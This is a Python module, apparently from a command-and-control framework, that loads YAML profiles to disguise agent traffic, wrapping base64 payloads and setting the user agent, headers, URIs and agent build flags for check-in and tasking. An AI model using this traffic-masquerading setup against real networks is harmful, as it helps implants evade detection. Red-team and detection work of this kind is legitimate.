import os
import yaml
from typing import Optional

PROFILES_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../profiles"))

_cache: dict = {}


def load_profile(name: str) -> dict:
    if name in _cache:
        return _cache[name]
    path = os.path.join(PROFILES_DIR, f"{name}.yaml")
    if not os.path.exists(path):
        return _default_profile()
    with open(path) as f:
        data = yaml.safe_load(f)
    _cache[name] = data
    return data


def list_profiles() -> list[dict]:
    profiles = [{"name": "default", "description": "Plain JSON — no traffic masquerading"}]
    if not os.path.isdir(PROFILES_DIR):
        return profiles
    for fname in sorted(os.listdir(PROFILES_DIR)):
        if fname.endswith(".yaml"):
            try:
                p = load_profile(fname[:-5])
                profiles.append({
                    "name": p["name"],
                    "description": p.get("description", ""),
                })
            except Exception:
                pass
    return profiles


def wrap_response(data: str, profile_name: str) -> tuple[str, str]:
    """
    Returns (wrapped_body, content_type).
    data is the base64-encoded payload string.
    """
    if profile_name == "default" or not profile_name:
        return data, "application/json"
    p = load_profile(profile_name)
    resp = p.get("http", {}).get("response", {})
    prefix = resp.get("prefix", "")
    suffix = resp.get("suffix", "")
    ct = resp.get("content_type", "application/json")
    return prefix + data + suffix, ct


def profile_uris(profile_name: str) -> dict:
    """Returns checkin/task/result URI templates with {id} placeholder."""
    if profile_name == "default" or not profile_name:
        return {
            "checkin": "/api/agents/checkin",
            "task":    "/api/agents/{id}/task",
            "result":  "/api/agents/{id}/result",
        }
    p = load_profile(profile_name)
    uris = p.get("http", {}).get("uris", {})
    return {
        "checkin": uris.get("checkin", "/api/agents/checkin"),
        "task":    uris.get("task",    "/api/agents/{id}/task"),
        "result":  uris.get("result",  "/api/agents/{id}/result"),
    }


def profile_ldflags(profile_name: str) -> dict:
    """Returns all ldflags vars for the agent build."""
    if profile_name == "default" or not profile_name:
        return {
            "ProfileName":        "default",
            "ProfileUA":          "",
            "ProfileCheckin":     "/api/agents/checkin",
            "ProfileTask":        "/api/agents/{id}/task",
            "ProfileResult":      "/api/agents/{id}/result",
            "ProfileHeaders":     "",
            "ProfileContentType": "application/json",
            "ProfileRespPrefix":  "",
            "ProfileRespSuffix":  "",
        }
    p = load_profile(profile_name)
    http = p.get("http", {})
    uris = http.get("uris", {})
    resp = http.get("response", {})
    headers = http.get("headers", {})
    headers_str = "|".join(f"{k}:{v}" for k, v in headers.items())
    return {
        "ProfileName":        p.get("name", profile_name),
        "ProfileUA":          http.get("user_agent", ""),
        "ProfileCheckin":     uris.get("checkin", "/api/agents/checkin"),
        "ProfileTask":        uris.get("task", "/api/agents/{id}/task"),
        "ProfileResult":      uris.get("result", "/api/agents/{id}/result"),
        "ProfileHeaders":     headers_str,
        "ProfileContentType": http.get("content_type", "application/json"),
        "ProfileRespPrefix":  resp.get("prefix", ""),
        "ProfileRespSuffix":  resp.get("suffix", ""),
    }


def _default_profile() -> dict:
    return {
        "name": "default",
        "description": "Plain JSON",
        "http": {
            "user_agent": "",
            "content_type": "application/json",
            "headers": {},
            "uris": {
                "checkin": "/api/agents/checkin",
                "task":    "/api/agents/{id}/task",
                "result":  "/api/agents/{id}/result",
            },
            "response": {"prefix": "", "suffix": "", "content_type": "application/json"},
        },
    }
